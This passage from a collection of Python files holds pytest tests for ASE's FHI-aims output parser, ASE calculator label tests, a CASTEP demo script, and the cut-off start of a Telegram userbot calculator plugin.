[eV/Ang]:\n        |    1          1.000000000000000E+00          2.000000000000000E+00          3.000000000000000E+00\n        |    2          6.000000000000000E+00          5.000000000000000E+00          4.000000000000000E+00\n        - Per atom stress (eV) used for heat flux calculation:\n        Atom   | Stress components (1,1), (2,2), (3,3), (1,2), (1,3), (2,3)\n        -------------------------------------------------------------------\n        1 |    -1.0000000000E+01   -2.0000000000E+01   -3.0000000000E+01   -4.0000000000E+01   -5.0000000000E+01   -6.0000000000E+01\n        2 |     1.0000000000E+01    2.0000000000E+01    3.0000000000E+01    4.0000000000E+01    5.0000000000E+01    6.0000000000E+01\n        -------------------------------------------------------------------\n        +-------------------------------------------------------------------+\n        |              Analytical stress tensor - Symmetrized               |\n        |                  Cartesian components [eV/A**3]                   |\n        +-------------------------------------------------------------------+\n        |                x                y                z                |\n        |                                                                   |\n        |  x         1.00000000       2.00000000       3.00000000           |\n        |  y         2.00000000       5.00000000       6.00000000           |\n        |  z         3.00000000       6.00000000       7.00000000           |\n        |                                                                   |\n        |  Pressure:       0.00383825   [eV/A**3]                           |\n        |                                                                   |\n        +-------------------------------------------------------------------+\n        Energy and forces in a compact form:\n        | Total energy uncorrected      :         -0.169503986610555E+05 eV\n        | Total energy corrected        :         -2.169503986610555E+05 eV  <-- do not rely on this value for anything but (periodic) metals\n        | Electronic free energy        :         -3.169503986610555E+05 eV\n        Performing Hirshfeld analysis of fragment charges and moments.\n        ----------------------------------------------------------------------\n        | Atom     1: Na\n        |   Hirshfeld charge        :      0.20898543\n        |   Free atom volume        :     82.26734086\n        |   Hirshfeld volume        :     73.39467444\n        |   Hirshfeld spin moment   :      0.00000000\n        |   Hirshfeld dipole vector :      0.00000000       0.00000000      -0.00000000\n        |   Hirshfeld dipole moment :      0.00000000\n        |   Hirshfeld second moments:      0.19955428       0.00000002       0.00000002\n        |                                  0.00000002       0.19955473      -0.00000005\n        |                                  0.00000002      -0.00000005       0.19955473\n        ----------------------------------------------------------------------\n        | Atom     2: Cl\n        |   Hirshfeld charge        :     -0.20840994\n        |   Free atom volume        :     65.62593663\n        |   Hirshfeld volume        :     62.86011074\n        |   Hirshfeld spin moment   :      0.00000000\n        |   Hirshfeld dipole vector :      0.00000000       0.00000000       0.00000000\n        |   Hirshfeld dipole moment :      0.00000000\n        |   Hirshfeld second moments:      0.01482616      -0.00000001      -0.00000001\n        |                                 -0.00000001       0.01482641       0.00000001\n        |                                 -0.00000001       0.00000001       0.01482641\n        ----------------------------------------------------------------------\n        Writing Kohn-Sham eigenvalues.\n\n        Spin-up eigenvalues:\n        K-point:       1 at    0.000000    0.000000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             0.036749           1.000000\n        2        1             0.183747           5.000000\n        3        0             0.330744           9.000000\n\n        Spin-down eigenvalues:\n        K-point:       1 at    0.000000    0.000000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             0.110248           3.000000\n        2        1             0.257245           7.000000\n        3        0             0.404243           11.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       2 at    0.000000    0.000000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             0.477741           13.000000\n        2        1             0.624739           17.000000\n        3        0             0.771736           21.000000\n\n        Spin-down eigenvalues:\n        K-point:       2 at    0.000000    0.000000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             0.551240           15.000000\n        2        1             0.698237           19.000000\n        3        0             0.845234           23.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       3 at    0.000000    0.500000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             0.918733           25.000000\n        2        1             1.065730           29.000000\n        3        0             1.212728           33.000000\n\n        Spin-down eigenvalues:\n        K-point:       3 at    0.000000    0.500000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             0.992232           27.000000\n        2        1             1.139229           31.000000\n        3        0             1.286226           35.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       4 at    0.000000    0.500000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             1.359725           37.000000\n        2        1             1.506722           41.000000\n        3        0             1.653720           45.000000\n\n        Spin-down eigenvalues:\n        K-point:       4 at    0.000000    0.500000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             1.433224           39.000000\n        2        1             1.580221           43.000000\n        3        0             1.727218           47.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       5 at    0.500000    0.000000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             1.800717           49.000000\n        2        1             1.947714           53.000000\n        3        0             2.094711           57.000000\n\n        Spin-down eigenvalues:\n        K-point:       5 at    0.500000    0.000000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             1.874216           51.000000\n        2        1             2.021213           55.000000\n        3        0             2.168210           59.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       6 at    0.500000    0.000000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             2.241709           61.000000\n        2        1             2.388706           65.000000\n        3        0             2.535703           69.000000\n\n        Spin-down eigenvalues:\n        K-point:       6 at    0.500000    0.000000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             2.315207           63.000000\n        2        1             2.462205           67.000000\n        3        0             2.609202           71.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       7 at    0.500000    0.500000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             2.682701           73.000000\n        2        1             2.829698           77.000000\n        3        0             2.976695           81.000000\n\n        Spin-down eigenvalues:\n        K-point:       7 at    0.500000    0.500000    0.000000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             2.756199           75.000000\n        2        1             2.903197           79.000000\n        3        0             3.050194           83.000000\n\n\n        Spin-up eigenvalues:\n        K-point:       8 at    0.500000    0.500000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             3.123693           85.000000\n        2        1             3.270690           89.000000\n        3        0             3.417687           93.000000\n\n        Spin-down eigenvalues:\n        K-point:       8 at    0.500000    0.500000    0.500000 (in units of recip. lattice)\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1        1             3.197191           87.000000\n        2        1             3.344189           91.000000\n        3        0             3.491186           95.000000\n\n        Current spin moment of the entire structure :\n        | N = N_up - N_down (sum over all k points):         0.00000\n        | S (sum over all k points)                :         0.00000\n\n        What follows are estimated values for band gap, HOMO, LUMO, etc.\n        | They are estimated on a discrete k-point grid and not necessarily exact.\n        | For converged numbers, create a DOS and/or band structure plot on a denser k-grid.\n\n        Highest occupied state (VBM) at     -8.19345940 eV (relative to internal zero)\n        | Occupation number:      1.00000000\n        | K-point:       1 at    0.000000    0.000000    0.000000 (in units of recip. lattice)\n        | Spin channel:        1\n\n        Lowest unoccupied state (CBM) at    -3.62542909 eV (relative to internal zero)\n        | Occupation number:      0.00000000\n        | K-point:       1 at    0.000000    0.000000    0.000000 (in units of recip. lattice)\n        | Spin channel:        1\n\n        ESTIMATED overall HOMO-LUMO gap:      4.56803031 eV between HOMO at k-point 1 and LUMO at k-point 1\n        | This appears to be a direct band gap.\n        The gap value is above 0.2 eV. Unless you are using a very sparse k-point grid\n        this system is most likely an insulator or a semiconductor.\n        | Chemical Potential                          :    -7.44914181 eV\n\n        Self-consistency cycle converged.\n        material is metallic within the approximate finite broadening function (occupation_type)\n        Have a nice day.\n        ------------------------------------------------------------\n    \"\"\"\n    lines = lines.splitlines()\n    for ll, line in enumerate(lines):\n        lines[ll] = line.strip()\n    return AimsOutCalcChunk(lines, header_chunk)\n\n\n@pytest.fixture\ndef eigenvalues_occupancies():\n    eigenvalues_occupancies = np.arange(8 * 3 * 4).reshape((8, 3, 2, 2))\n    eigenvalues_occupancies[:, 0, :, 0] = 1.0\n    eigenvalues_occupancies[:, 1, :, 0] = 1.0\n    eigenvalues_occupancies[:, 2, :, 0] = 0.0\n\n    return eigenvalues_occupancies\n\n\ndef test_calc_atoms(calc_chunk, initial_cell, initial_positions):\n    assert len(calc_chunk.atoms) == 2\n    assert np.allclose(calc_chunk.atoms.cell, initial_cell)\n    assert np.allclose(calc_chunk.atoms.positions, initial_positions)\n    assert np.all([\"Na\", \"Cl\"] == calc_chunk.atoms.symbols)\n    assert all(\n        [\n            str(const_1) == str(const_2)\n            for const_1, const_2 in zip(\n                calc_chunk.constraints, calc_chunk.atoms.constraints\n            )\n        ]\n    )\n\n\ndef test_calc_forces(calc_chunk):\n    forces = np.array([[1.0, 2.0, 3.0], [6.0, 5.0, 4.0]])\n    assert np.allclose(calc_chunk.forces, forces)\n\n    # Different because of the constraints\n    assert np.allclose(\n        calc_chunk.atoms.get_forces(), np.array(\n            [[0.0, 0.0, 3.0], [0.0, 0.0, 0.0]])\n    )\n    assert np.allclose(\n        calc_chunk.atoms.get_forces(\n            apply_constraint=False), forces)\n    assert np.allclose(calc_chunk.results[\"forces\"], forces)\n\n\ndef test_calc_stresses(calc_chunk):\n    stresses = np.array(\n        [\n            [-10.0, -20.0, -30.0, -60.0, -50.0, -40.0],\n            [10.0, 20.0, 30.0, 60.0, 50.0, 40.0],\n        ]\n    )\n    assert np.allclose(calc_chunk.stresses, stresses)\n    assert np.allclose(calc_chunk.atoms.get_stresses(), stresses)\n    assert np.allclose(calc_chunk.results[\"stresses\"], stresses)\n\n\ndef test_calc_stress(calc_chunk):\n    stress = full_3x3_to_voigt_6_stress(\n        np.array(\n            [\n                [1.00000000, 2.00000000, 3.00000000],\n                [2.00000000, 5.00000000, 6.00000000],\n                [3.00000000, 6.00000000, 7.00000000],\n            ]\n        )\n    )\n    assert np.allclose(calc_chunk.stress, stress)\n    assert np.allclose(calc_chunk.atoms.get_stress(), stress)\n    assert np.allclose(calc_chunk.results[\"stress\"], stress)\n\n\ndef test_calc_free_energy(calc_chunk):\n    free_energy = -3.169503986610555e05\n    assert np.abs(calc_chunk.free_energy - free_energy) < eps_hp\n    assert (\n        np.abs(calc_chunk.atoms.calc.get_property(\n            \"free_energy\") - free_energy) < eps_hp\n    )\n    assert np.abs(calc_chunk.results[\"free_energy\"] - free_energy) < eps_hp\n\n\ndef test_calc_energy(calc_chunk):\n    energy = -2.169503986610555e05\n    assert np.abs(calc_chunk.energy - energy) < eps_hp\n    assert np.abs(calc_chunk.atoms.get_potential_energy() - energy) < eps_hp\n    assert np.abs(calc_chunk.results[\"energy\"] - energy) < eps_hp\n\n\ndef test_calc_magnetic_moment(calc_chunk):\n    magmom = 0\n    assert calc_chunk.magmom == magmom\n    assert calc_chunk.atoms.get_magnetic_moment() == magmom\n    assert calc_chunk.results[\"magmom\"] == magmom\n\n\ndef test_calc_n_iter(calc_chunk):\n    n_iter = 58\n    assert calc_chunk.n_iter == n_iter\n    assert calc_chunk.results[\"n_iter\"] == n_iter\n\n\ndef test_calc_fermi_energy(calc_chunk):\n    Ef = -8.24271207\n    assert np.abs(calc_chunk.E_f - Ef) < eps_lp\n    assert np.abs(calc_chunk.results[\"fermi_energy\"] - Ef) < eps_lp\n\n\ndef test_calc_dipole(calc_chunk):\n    assert calc_chunk.dipole is None\n\n\ndef test_calc_is_metallic(calc_chunk):\n    assert calc_chunk.is_metallic\n\n\ndef test_calc_converged(calc_chunk):\n    assert calc_chunk.converged\n\n\ndef test_calc_hirshfeld_charges(calc_chunk):\n    hirshfeld_charges = [0.20898543, -0.20840994]\n    assert np.allclose(calc_chunk.hirshfeld_charges, hirshfeld_charges)\n    assert np.allclose(\n        calc_chunk.results[\"hirshfeld_charges\"],\n        hirshfeld_charges)\n\n\ndef test_calc_hirshfeld_volumes(calc_chunk):\n    hirshfeld_volumes = [73.39467444, 62.86011074]\n    assert np.allclose(calc_chunk.hirshfeld_volumes, hirshfeld_volumes)\n    assert np.allclose(\n        calc_chunk.results[\"hirshfeld_volumes\"],\n        hirshfeld_volumes)\n\n\ndef test_calc_hirshfeld_atomic_dipoles(calc_chunk):\n    hirshfeld_atomic_dipoles = np.zeros((2, 3))\n    assert np.allclose(\n        calc_chunk.hirshfeld_atomic_dipoles,\n        hirshfeld_atomic_dipoles)\n    assert np.allclose(\n        calc_chunk.results[\"hirshfeld_atomic_dipoles\"], hirshfeld_atomic_dipoles\n    )\n\n\ndef test_calc_hirshfeld_dipole(calc_chunk):\n    assert calc_chunk.hirshfeld_dipole is None\n\n\ndef test_calc_eigenvalues(calc_chunk, eigenvalues_occupancies):\n    assert np.allclose(calc_chunk.eigenvalues,\n                       eigenvalues_occupancies[:, :, :, 1])\n    assert np.allclose(\n        calc_chunk.results[\"eigenvalues\"], eigenvalues_occupancies[:, :, :, 1]\n    )\n\n\ndef test_calc_occupancies(calc_chunk, eigenvalues_occupancies):\n    assert np.allclose(calc_chunk.occupancies,\n                       eigenvalues_occupancies[:, :, :, 0])\n    assert np.allclose(\n        calc_chunk.results[\"occupancies\"], eigenvalues_occupancies[:, :, :, 0]\n    )\n\n\n@pytest.fixture\ndef molecular_positions():\n    return np.array(\n        [\n            [0.00000000, 0.00000000, 0.00000000],\n            [0.95840000, 0.00000000, 0.00000000],\n            [-0.24000000, 0.92790000, 0.00000000],\n        ]\n    )\n\n\n@pytest.fixture\ndef molecular_header_chunk():\n    lines = \"\"\"\n        | Number of atoms                   :        3\n        | Number of spin channels           :        1\n        The structure contains        3 atoms  and a total of         10.000 electrons.\n        Input geometry:\n        | Atomic structure:\n        |       Atom                x [A]            y [A]            z [A]\n        |    1: Species O             0.00000000        0.00000000        0.00000000\n        |    2: Species H             0.95840000        0.00000000        0.00000000\n        |    3: Species H            -0.24000000        0.92790000        0.00000000\n        'Geometry relaxation: A file geometry.in.next_step is written out by default after each step.'\n        | Maximum number of basis functions            :        7\n        | Number of Kohn-Sham states (occupied + empty):       11\n        Reducing total number of  Kohn-Sham states to        7.\n    \"\"\"\n\n    lines = lines.splitlines()\n    for ll, line in enumerate(lines):\n        lines[ll] = line.strip()\n\n    return AimsOutHeaderChunk(lines)\n\n\n@pytest.mark.parametrize(\n    \"attrname\",\n    [\n        \"k_points\",\n        \"k_point_weights\",\n        \"initial_cell\",\n        \"n_k_points\",\n    ],\n)\ndef test_chunk_molecular_header_defaults_none(attrname, molecular_header_chunk):\n    assert getattr(molecular_header_chunk, attrname) is None\n\n\ndef test_molecular_header_constraints(molecular_header_chunk):\n    assert molecular_header_chunk.constraints == []\n\n\ndef test_molecular_header_n_bands(molecular_header_chunk):\n    assert molecular_header_chunk.n_bands == 7\n\n\ndef test_molecular_header_initial_atoms(\n        molecular_header_chunk, molecular_positions):\n    assert len(molecular_header_chunk.initial_atoms) == 3\n    assert np.all([\"O\", \"H\", \"H\"] ==\n                  molecular_header_chunk.initial_atoms.symbols)\n    assert np.allclose(\n        molecular_header_chunk.initial_atoms.positions,\n        np.array(\n            [\n                [0.00000000, 0.00000000, 0.00000000],\n                [0.95840000, 0.00000000, 0.00000000],\n                [-0.24000000, 0.92790000, 0.00000000],\n            ]\n        ),\n    )\n\n\n@pytest.fixture\ndef molecular_calc_chunk(molecular_header_chunk):\n    lines = \"\"\"\n        | Number of self-consistency cycles          :           7\n        | Chemical Potential                          :    -0.61315483 eV\n        Updated atomic structure:\n        x [A]             y [A]             z [A]\n        atom        -0.00191785       -0.00243279        0.00000000  O\n        atom         0.97071531       -0.00756333        0.00000000  H\n        atom        -0.25039746        0.93789612       -0.00000000  H\n        | Total dipole moment [eAng]          :          0.260286493869765E+00         0.336152447755231E+00         0.470003778119121E-15\n        Energy and forces in a compact form:\n        | Total energy uncorrected      :         -0.206778551123339E+04 eV\n        | Total energy corrected        :         -5.206778551123339E+04 eV  <-- do not rely on this value for anything but (periodic) metals\n        | Electronic free energy        :         -2.206778551123339E+04 eV\n        Total atomic forces (unitary forces cleaned) [eV/Ang]:\n        |    1          0.502371357164392E-03          0.518627676606471E-03          0.000000000000000E+00\n        |    2         -0.108826758257187E-03         -0.408128912334209E-03         -0.649037698626122E-27\n        |    3         -0.393544598907207E-03         -0.110498764272267E-03         -0.973556547939183E-27\n        Performing Hirshfeld analysis of fragment charges and moments.\n        ----------------------------------------------------------------------\n        | Atom     1: O\n        |   Hirshfeld charge        :     -0.32053200\n        |   Free atom volume        :     23.59848617\n        |   Hirshfeld volume        :     21.83060659\n        |   Hirshfeld dipole vector :      0.04249319       0.05486053       0.00000000\n        |   Hirshfeld dipole moment :      0.06939271\n        |   Hirshfeld second moments:      0.04964380      -0.04453278      -0.00000000\n        |                                 -0.04453278       0.02659295       0.00000000\n        |                                 -0.00000000       0.00000000      -0.05608173\n        ----------------------------------------------------------------------\n        | Atom     2: H\n        |   Hirshfeld charge        :      0.16022630\n        |   Free atom volume        :     10.48483941\n        |   Hirshfeld volume        :      6.07674041\n        |   Hirshfeld dipole vector :      0.13710134      -0.00105126       0.00000000\n        |   Hirshfeld dipole moment :      0.13710537\n        |   Hirshfeld second moments:      0.12058896      -0.01198026      -0.00000000\n        |                                 -0.01198026       0.14550360       0.00000000\n        |                                 -0.00000000       0.00000000       0.10836357\n        ----------------------------------------------------------------------\n        | Atom     3: H\n        |   Hirshfeld charge        :      0.16020375\n        |   Free atom volume        :     10.48483941\n        |   Hirshfeld volume        :      6.07684447\n        |   Hirshfeld dipole vector :     -0.03534982       0.13248706       0.00000000\n        |   Hirshfeld dipole moment :      0.13712195\n        |   Hirshfeld second moments:      0.14974686      -0.00443579      -0.00000000\n        |                                 -0.00443579       0.11633028      -0.00000000\n        |                                 -0.00000000      -0.00000000       0.10836209\n        ----------------\n        Writing Kohn-Sham eigenvalues.\n\n        State    Occupation    Eigenvalue [Ha]    Eigenvalue [eV]\n        1       2.00000         -18.640915         -507.24511\n        2       2.00000          -0.918449          -24.99226\n        3       2.00000          -0.482216          -13.12175\n        4       2.00000          -0.338691           -9.21626\n        5       2.00000          -0.264427           -7.19543\n        6       0.00000          -0.000414           -0.01127\n        7       0.00000           0.095040            2.58616\n\n        Highest occupied state (VBM) at     -7.19542820 eV\n        | Occupation number:      2.00000000\n\n        Lowest unoccupied state (CBM) at    -0.01126981 eV\n        | Occupation number:      0.00000000\n\n        Overall HOMO-LUMO gap:      7.18415839 eV.\n        | Chemical Potential                          :    -0.61315483 eV\n\n        Self-consistency cycle converged.\n        Have a nice day.\n        ------------------------------------------------------------\n\n    \"\"\"\n    lines = lines.splitlines()\n    for ll, line in enumerate(lines):\n        lines[ll] = line.strip()\n    return AimsOutCalcChunk(lines, molecular_header_chunk)\n\n\n@pytest.fixture\ndef molecular_positions():\n    return np.array(\n        [\n            [-0.00191785, -0.00243279, 0.00000000],\n            [0.97071531, -0.00756333, 0.00000000],\n            [-0.25039746, 0.93789612, 0.00000000],\n        ]\n    )\n\n\ndef test_molecular_calc_atoms(molecular_calc_chunk, molecular_positions):\n    assert len(molecular_calc_chunk.atoms) == 3\n    assert np.allclose(\n        molecular_calc_chunk.atoms.positions,\n        molecular_positions)\n    assert np.all([\"O\", \"H\", \"H\"] == molecular_calc_chunk.atoms.symbols)\n\n\ndef test_molecular_calc_forces(molecular_calc_chunk):\n    forces = np.array(\n        [\n            [0.502371357164392e-03, 0.518627676606471e-03, 0.000000000000000e00],\n            [-0.108826758257187e-03, -0.408128912334209e-03, -0.649037698626122e-27],\n            [-0.393544598907207e-03, -0.110498764272267e-03, -0.973556547939183e-27],\n        ]\n    )\n    assert np.allclose(molecular_calc_chunk.forces, forces)\n    assert np.allclose(molecular_calc_chunk.atoms.get_forces(), forces)\n    assert np.allclose(molecular_calc_chunk.results[\"forces\"], forces)\n\n\n@pytest.mark.parametrize(\n    \"attrname\",\n    [\n        \"stresses\",\n        \"stress\",\n        \"magmom\",\n        \"E_f\",\n    ],\n)\ndef test_chunk_molecular_defaults_none(attrname, molecular_calc_chunk):\n    assert getattr(molecular_calc_chunk, attrname) is None\n\n\ndef test_molecular_calc_free_energy(molecular_calc_chunk):\n    free_energy = -2.206778551123339e04\n    assert np.abs(molecular_calc_chunk.free_energy - free_energy) < eps_hp\n    assert np.abs(\n        molecular_calc_chunk.results[\"free_energy\"] -\n        free_energy) < eps_hp\n    assert (\n        np.abs(\n            molecular_calc_chunk.atoms.calc.get_property(\n                \"free_energy\") - free_energy\n        )\n        < eps_hp\n    )\n\n\ndef test_molecular_calc_energy(molecular_calc_chunk):\n    energy = -0.206778551123339e04\n    assert np.abs(molecular_calc_chunk.energy - energy) < eps_hp\n    assert np.abs(\n        molecular_calc_chunk.atoms.get_potential_energy() -\n        energy) < eps_hp\n    assert np.abs(molecular_calc_chunk.results[\"energy\"] - energy) < eps_hp\n\n\ndef test_molecular_calc_n_iter(molecular_calc_chunk):\n    n_iter = 7\n    assert molecular_calc_chunk.n_iter == n_iter\n    assert molecular_calc_chunk.results[\"n_iter\"] == n_iter\n\n\ndef test_molecular_calc_dipole(molecular_calc_chunk):\n    dipole = [0.260286493869765, 0.336152447755231, 0.470003778119121e-15]\n    assert np.allclose(molecular_calc_chunk.dipole, dipole)\n    assert np.allclose(molecular_calc_chunk.atoms.get_dipole_moment(), dipole)\n    assert np.allclose(molecular_calc_chunk.results[\"dipole\"], dipole)\n\n\ndef test_molecular_calc_is_metallic(molecular_calc_chunk):\n    assert not molecular_calc_chunk.is_metallic\n\n\ndef test_molecular_calc_converged(molecular_calc_chunk):\n    assert molecular_calc_chunk.converged\n\n\n@pytest.fixture\ndef molecular_hirshfeld_charges():\n    return np.array([-0.32053200, 0.16022630, 0.16020375])\n\n\ndef test_molecular_calc_hirshfeld_charges(\n    molecular_calc_chunk, molecular_hirshfeld_charges\n):\n    assert np.allclose(\n        molecular_calc_chunk.hirshfeld_charges, molecular_hirshfeld_charges\n    )\n    assert np.allclose(\n        molecular_calc_chunk.results[\"hirshfeld_charges\"], molecular_hirshfeld_charges\n    )\n\n\ndef test_molecular_calc_hirshfeld_volumes(molecular_calc_chunk):\n    hirshfeld_volumes = np.array([21.83060659, 6.07674041, 6.07684447])\n    assert np.allclose(\n        molecular_calc_chunk.hirshfeld_volumes,\n        hirshfeld_volumes)\n    assert np.allclose(\n        molecular_calc_chunk.results[\"hirshfeld_volumes\"], hirshfeld_volumes\n    )\n\n\ndef test_molecular_calc_hirshfeld_atomic_dipoles(molecular_calc_chunk):\n    hirshfeld_atomic_dipoles = np.array(\n        [\n            [0.04249319, 0.05486053, 0.00000000],\n            [0.13710134, -0.00105126, 0.00000000],\n            [-0.03534982, 0.13248706, 0.00000000],\n        ]\n    )\n    assert np.allclose(\n        molecular_calc_chunk.hirshfeld_atomic_dipoles, hirshfeld_atomic_dipoles\n    )\n    assert np.allclose(\n        molecular_calc_chunk.results[\"hirshfeld_atomic_dipoles\"],\n        hirshfeld_atomic_dipoles,\n    )\n\n\ndef test_molecular_calc_hirshfeld_dipole(\n    molecular_calc_chunk, molecular_hirshfeld_charges, molecular_positions\n):\n    hirshfeld_dipole = np.sum(\n        molecular_hirshfeld_charges.reshape((-1, 1)) * molecular_positions, axis=1\n    )\n    assert np.allclose(molecular_calc_chunk.hirshfeld_dipole, hirshfeld_dipole)\n    assert np.allclose(\n        molecular_calc_chunk.results[\"hirshfeld_dipole\"], hirshfeld_dipole\n    )\n\n\ndef test_molecular_calc_eigenvalues(molecular_calc_chunk):\n    eigenvalues = [\n        -507.24511,\n        -24.99226,\n        -13.12175,\n        -9.21626,\n        -7.19543,\n        -0.01127,\n        2.58616,\n    ]\n    assert np.allclose(molecular_calc_chunk.eigenvalues[0, :, 0], eigenvalues)\n    assert np.allclose(\n        molecular_calc_chunk.results[\"eigenvalues\"][0, :, 0], eigenvalues\n    )\n\n\ndef test_molecular_calc_occupancies(molecular_calc_chunk):\n    occupancies = [\n        2.0,\n        2.0,\n        2.0,\n        2.0,\n        2.0,\n        0.0,\n        0.0,\n    ]\n    assert np.allclose(molecular_calc_chunk.occupancies[0, :, 0], occupancies)\n    assert np.allclose(\n        molecular_calc_chunk.results[\"occupancies\"][0, :, 0], occupancies\n    )\n", "5": "def test_calculator_label():\n    from ase.calculators.calculator import Calculator\n\n    calc = Calculator()\n    assert calc.directory == '.'\n    assert calc.prefix is None\n    assert calc.label is None\n\n    calc.label = 'dir/pref'\n    assert calc.directory == 'dir'\n    assert calc.prefix == 'pref'\n    assert calc.label == 'dir/pref'\n\n    calc.label = 'dir2/'\n    assert calc.directory == 'dir2'\n    assert calc.prefix is None\n    assert calc.label == 'dir2/'\n\n    calc.label = 'hello'\n    assert calc.directory == '.'\n    assert calc.prefix == 'hello'\n    assert calc.label == 'hello'\n\n    calc.label = None\n    assert calc.label is None\n    assert calc.prefix is None\n    assert calc.directory == '.'\n", "6": "from pathlib import Path\nimport pytest\nfrom ase.calculators.calculator import Calculator\n\n\ndef test_directory_and_label():\n    def normalize(path):\n        \"\"\"Helper function to normalize path\"\"\"\n        return str(Path(path))\n\n    calc = Calculator()\n\n    assert calc.directory == '.'\n    assert calc.label is None\n\n    calc.directory = 'somedir'\n\n    assert calc.directory == 'somedir'\n    assert calc.label == 'somedir/'\n\n    # We cannot redundantly specify directory\n    with pytest.raises(ValueError):\n        calc = Calculator(directory='somedir',\n                          label='anotherdir/label')\n\n    # Test only directory in directory\n    calc = Calculator(directory='somedir',\n                      label='label')\n\n    assert calc.directory == 'somedir'\n    assert calc.label == 'somedir/label'\n\n    wdir = '/home/somedir'\n    calc = Calculator(directory=wdir,\n                      label='label')\n\n    assert calc.directory == normalize(wdir)\n    assert calc.label == normalize(wdir) + '/label'\n\n    # Test we can handle pathlib directories\n    wdir = Path('/home/somedir')\n    calc = Calculator(directory=wdir,\n                      label='label')\n    assert calc.directory == normalize(wdir)\n    assert calc.label == normalize(wdir) + '/label'\n\n    with pytest.raises(ValueError):\n        calc = Calculator(directory=wdir,\n                          label='somedir/label')\n\n    # Passing in empty directories with directories in label should be OK\n    for wdir in ['somedir', '/home/directory']:\n        label = wdir + '/label'\n        expected_label = normalize(wdir) + '/label'\n        calc = Calculator(directory='', label=label)\n        assert calc.label == expected_label\n        assert calc.directory == normalize(wdir)\n\n        calc = Calculator(directory='.', label=label)\n        assert calc.label == expected_label\n        assert calc.directory == normalize(wdir)\n\n\ndef test_deprecated_get_spin_polarized():\n    calc = Calculator()\n    with pytest.warns(FutureWarning):\n        spinpol = calc.get_spin_polarized()\n    assert spinpol is False\n", "7": "\"\"\"This simple demo calculates the total energy of CO molecules\nusing once LDA and once PBE as xc-functional. Obviously\nsome parts in this scripts are longer than necessary, but are shown\nto demonstrate some more features.\"\"\"\n\nimport ase\nimport ase.calculators.castep\nimport ase.io.castep\n\ncalc = ase.calculators.castep.Castep()\ndirectory = 'CASTEP_ASE_DEMO'\n\n# include interface settings in .param file\ncalc._export_settings = True\n\n# reuse the same directory\ncalc._directory = directory\ncalc._rename_existing_dir = False\ncalc._label = 'CO_LDA'\n\n# necessary for tasks with changing positions\n# such as GeometryOptimization or MolecularDynamics\ncalc._set_atoms = True\n\n# Param settings\ncalc.param.xc_functional = 'LDA'\ncalc.param.cut_off_energy = 400\n# Prevent CASTEP from writing *wvfn* files\ncalc.param.num_dump_cycles = 0\n\n# Cell settings\ncalc.cell.kpoint_mp_grid = '1 1 1'\ncalc.cell.fix_com = False\ncalc.cell.fix_all_cell = True\n\n# Set and clear and reset settings (just for shows)\ncalc.param.task = 'SinglePoint'\n# Reset to CASTEP default\ncalc.param.task.clear()\n\n# all of the following are identical\ncalc.param.task = 'GeometryOptimization'\ncalc.task = 'GeometryOptimization'\ncalc.TASK = 'GeometryOptimization'\ncalc.Task = 'GeometryOptimization'\n\n\n# Prepare atoms\nmol = ase.atoms.Atoms('CO', [[0, 0, 0], [0, 0, 1.2]], cell=[10, 10, 10])\nmol.calc = calc\n\n# Check for correct input\nif calc.dryrun_ok():\n    print('%s : %s ' % (mol.calc._label, mol.get_potential_energy()))\nelse:\n    print(\"Found error in input\")\n    print(calc._error)\n\n\n# Read all settings from previous calculation\nmol = ase.io.castep.read_seed('%s/CO_LDA' % directory)\n\n# Use the OTF pseudo-potential we have just generated\nmol.calc.set_pspot('OTF')\n\n# Change some settings\nmol.calc.param.xc_functional = 'PBE'\n# don't forget to set an appropriate label\nmol.calc._label = 'CO_PBE'\n# Recalculate the potential energy\nprint('%s : %s ' % (mol.calc._label, mol.get_potential_energy()))\n", "8": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        